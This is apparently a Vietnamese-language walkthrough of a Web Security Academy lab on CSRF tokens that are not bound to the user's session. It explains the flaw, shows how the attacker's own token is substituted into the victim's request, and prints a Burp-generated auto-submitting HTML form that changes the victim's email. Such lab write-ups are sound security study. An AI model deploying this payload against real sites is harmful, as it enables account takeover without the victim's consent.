![image](https://github.com/user-attachments/assets/f711f2ea-1328-4e64-a85e-5552148e7b28)

Đọc mô tả challenge thì ta có thể thấy được rằng challenge này nó liên quan đến việc mà hệ thống xử lí csrf token không đúng cách dẫn đến attacker có thể đổi email của user.

Cụ thể là hệ thống nó check csrf token tuy đúng nhưng chưa đủ, tức là nó sẽ check xem token này đã được dùng hay chưa, nếu chưa dùng thì nó sẽ được thực hiện mà ko check xem token này có thuộc về user A hay là 1 user nào đó khác dẫn đến attacker có thể dùng token của attacker để khai thác.

Tiến hành kiểm chứng.

![image](https://github.com/user-attachments/assets/0e622a80-7b37-4d3c-926c-b5eb586602f8)

Bắt request của user và ta thấy được nó đi kèm 1 csrf token của user.

![image](https://github.com/user-attachments/assets/79a06fbc-ffb8-495c-b0ed-71f85688dfa3)

Ta tiến hành đăng nhập vào acc attacker và vào kiếm csrf token của attacker, sau khi đã có csrf token của attacker thì ta tiến hành thay thế csrf token của attacker vào user.

![image](https://github.com/user-attachments/assets/a08b5af1-885d-4ded-aeff-bf0424ee96b7)

Sau khi đã thế vào thì ta tiến hành tạo payload và gửi cho con bot nó click vào thôi. Bạn có thể tham khảo payload mà tôi viết ở các challenge trước, nhưng challenge này tôi lười nên là dùng đồ của `burp pro` luon =)).

![image](https://github.com/user-attachments/assets/0f58bb63-3c85-463a-9dba-c43f3b9a4d54)

Bạn có thể làm như này để nó gen ra poc csrf :")), quá ngon luôn.

![image](https://github.com/user-attachments/assets/df2bf6ba-12f0-4459-a423-e508e09e1bb7)

và ta đã được 1 quả poc xịn đét v:

Payload:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ac10021030fd8568050b23e00e30025.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="admin2&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="mAp9DiSUqL6JBdfu5nIt5QhwrbXI4dXj" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

tiến hành gửi cho con bot và solve challenge này thôi.

![image](https://github.com/user-attachments/assets/d21eda92-005b-40c7-9295-24b5df85cb46)

Thành công rồi nhé :">
